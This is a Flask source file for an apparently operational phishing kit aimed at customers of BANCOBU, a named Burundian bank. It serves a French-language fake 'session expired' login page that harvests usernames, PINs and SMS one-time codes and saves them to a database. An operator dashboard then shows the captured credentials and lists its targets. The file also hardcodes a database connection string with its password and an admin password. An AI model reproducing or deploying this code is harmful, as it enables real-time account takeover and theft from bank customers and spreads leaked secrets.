from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import psycopg2
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)
app.config['PREFERRED_URL_SCHEME'] = 'https'

DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:ShJf3c9NA4Jf1ADITLYh3fIlHc7akHXC@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id SERIAL PRIMARY KEY,
                timestamp TIMESTAMP DEFAULT NOW(),
                ip TEXT,
                user_agent TEXT,
                username TEXT,
                pin TEXT,
                otp TEXT,
                step TEXT
            )
        ''')
        conn.commit()
        print("[+] Database ready")
    except Exception as e:
        print(f"[-] DB error: {e}")
    finally:
        if cur: cur.close()
        if conn: conn.close()

init_db()

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>MLW Control - Banking Intelligence</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e27; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #ff3366; border-bottom: 2px solid #ff3366; padding-bottom: 10px; margin-bottom: 20px; }
        h2 { color: #ffd700; margin-top: 30px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #00ffcc; padding: 10px; text-align: left; }
        th { background: #1a1f3a; }
        .login { max-width: 400px; margin: 100px auto; background: #1a1f3a; padding: 30px; border-radius: 10px; }
        input, button { width: 100%; padding: 12px; margin: 10px 0; background: #0a0e27; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; }
        .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
        .stat-box { background: #0a0e27; padding: 10px 20px; border-radius: 8px; }
        .success { color: #00ff00; font-weight: bold; }
        .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #666; }
        .step-badge { background: #ffd700; color: #0a0e27; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
    </style>
    <script>
        async function checkAuth() {
            const res = await fetch('/api/auth');
            const data = await res.json();
            if (!data.authenticated) {
                document.getElementById('login').style.display = 'block';
                document.getElementById('content').style.display = 'none';
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                loadData();
                setInterval(loadData, 5000);
            }
        }
        async function login() {
            const pwd = document.getElementById('pwd').value;
            const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password: pwd }) });
            const data = await res.json();
            if (data.success) checkAuth();
            else alert('Wrong password');
        }
        async function loadData() {
            const res = await fetch('/api/data');
            const data = await res.json();
            let html = '';
            for (let r of data) {
                html += `<tr>
                    <td>${r.timestamp}</td>
                    <td>${r.ip}</td>
                    <td><span class="badge">${r.username || '-'}</span></td>
                    <td><span class="badge">${r.pin || '-'}</span></td>
                    <td><span class="badge">${r.otp || '-'}</span></td>
                    <td><span class="step-badge">${r.step || '-'}</span></td>
                    <td>${r.user_agent ? r.user_agent.substring(0, 50) : '-'}</td>
                </tr>`;
            }
            document.getElementById('data').innerHTML = html;
            document.getElementById('stats').innerHTML = `<span class="success">●</span> Captured: ${data.length} credentials`;
        }
        checkAuth();
    </script>
</head>
<body>
<div id="login" class="login">
    <center><h2>🔐 MLW Banking Intelligence</h2></center>
    <input type="password" id="pwd" placeholder="Access Key">
    <button onclick="login()">Authenticate</button>
</div>
<div id="content" style="display:none">
    <h1>🏦 MLW Control - Banking Intelligence Dashboard</h1>
    <div class="stats">
        <div class="stat-box">🔴 Status: <span class="success">ACTIVE</span></div>
        <div class="stat-box" id="stats">📊 Captured: 0</div>
        <div class="stat-box">🎯 Target: BANCOBU / Yaga / SOS Medias</div>
    </div>
    <h2>📋 Captured Credentials (Identifiant + PIN + OTP)</h2>
    <div style="overflow-x: auto;">
    <tr>
        <thead><tr><th>Time</th><th>IP</th><th>Identifiant</th><th>Code PIN</th><th>Code OTP</th><th>Step</th><th>User Agent</th></tr></thead>
        <tbody id="data"></tbody>
    </table>
    </div>
    <div class="footer">MLW Security Operations - Banking Intelligence</div>
</div>
</body>
</html>
'''

PHISHING_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>BANCOBU - Session Expired</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #004d99 0%, #00264d 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            max-width: 450px;
            width: 100%;
            padding: 35px;
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #004d99;
            margin-bottom: 10px;
        }
        .logo span { color: #ffcc00; }
        .subtitle {
            color: #666;
            font-size: 13px;
            margin-bottom: 25px;
            border-bottom: 1px solid #eee;
            padding-bottom: 15px;
        }
        h2 {
            color: #003366;
            margin-bottom: 10px;
            font-size: 18px;
        }
        .error-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            text-align: left;
            border-radius: 8px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #003366;
            font-size: 13px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            transition: 0.2s;
        }
        .input-group input:focus {
            border-color: #004d99;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #004d99 0%, #00264d 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .btn-otp {
            background: linear-gradient(135deg, #ffcc00 0%, #ffb300 100%);
            color: #00264d;
            display: none;
        }
        .message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 8px;
            font-size: 13px;
            display: none;
        }
        .success-msg {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .info-msg {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        .footer {
            margin-top: 25px;
            font-size: 11px;
            color: #999;
        }
        .otp-group {
            display: none;
            margin-top: 15px;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">BANCOBU <span>| Enoti</span></div>
    <div class="subtitle">Banque Commerciale du Burundi</div>

    <div id="step1">
        <div class="error-box">
            ⚠️ <strong>Session expirée</strong><br>
            Votre session a expiré pour des raisons de sécurité. Veuillez vous reconnecter.
        </div>

        <div class="input-group">
            <label>Identifiant d'utilisateur</label>
            <input type="text" id="username" placeholder="ex: agent.enoti">
        </div>
        <div class="input-group">
            <label>Code PIN</label>
            <input type="password" id="pin" placeholder="••••••">
        </div>

        <button id="loginBtn" onclick="submitLogin()">Se connecter</button>
    </div>

    <div id="step2" style="display:none;">
        <div class="info-msg message" style="display:block; margin-bottom:20px;">
            📱 <strong>Code OTP envoyé</strong><br>
            Un code de vérification a été envoyé sur votre téléphone. Veuillez le saisir ci-dessous.
        </div>

        <div class="input-group">
            <label>Code OTP de vérification</label>
            <input type="text" id="otp" placeholder="Entrez le code reçu par SMS">
        </div>

        <button class="btn-otp" id="otpBtn" onclick="submitOTP()" style="display:block;">Confirmer le code OTP</button>
    </div>

    <div id="loading" style="display:none;">
        <p>⏳ Vérification en cours...</p>
    </div>

    <div id="result" class="message"></div>
    <div class="footer">🔒 Connexion sécurisée | BANCOBU</div>
</div>

<script>
    async function submitLogin() {
        const username = document.getElementById('username').value;
        const pin = document.getElementById('pin').value;

        if (!username || !pin) {
            alert("Veuillez remplir tous les champs");
            return;
        }

        document.getElementById('step1').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        const response = await fetch('/api/capture_login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: username, pin: pin })
        });

        const data = await response.json();

        if (data.status === 'ok') {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        } else {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
            alert("Erreur technique. Veuillez réessayer.");
        }
    }

    async function submitOTP() {
        const otp = document.getElementById('otp').value;
        const username = document.getElementById('username').value;

        if (!otp) {
            alert("Veuillez entrer le code OTP reçu");
            return;
        }

        document.getElementById('step2').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        const response = await fetch('/api/capture_otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: username, otp: otp })
        });

        const data = await response.json();

        if (data.status === 'ok') {
            document.getElementById('loading').style.display = 'none';
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = "✅ Vérification réussie ! Redirection en cours...";
            resultDiv.className = "message success-msg";
            resultDiv.style.display = "block";
            setTimeout(() => {
                window.location.href = "https://www.bancobu.bi";
            }, 2000);
        } else {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            alert("Code OTP invalide. Veuillez réessayer.");
        }
    }
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(DASHBOARD_HTML)

@app.route('/update')
def update():
    return render_template_string(PHISHING_HTML)

@app.route('/api/auth')
def auth():
    return jsonify({'authenticated': request.cookies.get('mlw_auth') == 'true'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('password') == '0880Mdav!':
        resp = jsonify({'success': True})
        resp.set_cookie('mlw_auth', 'true', httponly=True, secure=True, samesite='Strict')
        return resp
    return jsonify({'success': False})

@app.route('/api/capture_login', methods=['POST'])
def capture_login():
    data = request.json
    username = data.get('username', '')
    pin = data.get('pin', '')
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO captured_credentials (ip, user_agent, username, pin, step)
            VALUES (%s, %s, %s, %s, %s)
        ''', (
            request.remote_addr,
            request.headers.get('User-Agent', ''),
            username,
            pin,
            'LOGIN'
        ))
        conn.commit()
        print(f"[!] LOGIN CAPTURED! Username: {username}, PIN: {pin}, IP: {request.remote_addr}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'status': 'error'}), 500
    finally:
        if cur: cur.close()
        if conn: conn.close()

@app.route('/api/capture_otp', methods=['POST'])
def capture_otp():
    data = request.json
    username = data.get('username', '')
    otp = data.get('otp', '')
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO captured_credentials (ip, user_agent, username, otp, step)
            VALUES (%s, %s, %s, %s, %s)
        ''', (
            request.remote_addr,
            request.headers.get('User-Agent', ''),
            username,
            otp,
            'OTP'
        ))
        conn.commit()
        print(f"[!] OTP CAPTURED! Username: {username}, OTP: {otp}, IP: {request.remote_addr}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'status': 'error'}), 500
    finally:
        if cur: cur.close()
        if conn: conn.close()

@app.route('/api/data')
def get_data():
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('SELECT timestamp, ip, username, pin, otp, step, user_agent FROM captured_credentials ORDER BY timestamp DESC LIMIT 100')
        rows = cur.fetchall()
        return jsonify([{'timestamp': r[0], 'ip': r[1], 'username': r[2], 'pin': r[3], 'otp': r[4], 'step': r[5], 'user_agent': r[6]} for r in rows])
    except Exception as e:
        return jsonify([])
    finally:
        if cur: cur.close()
        if conn: conn.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
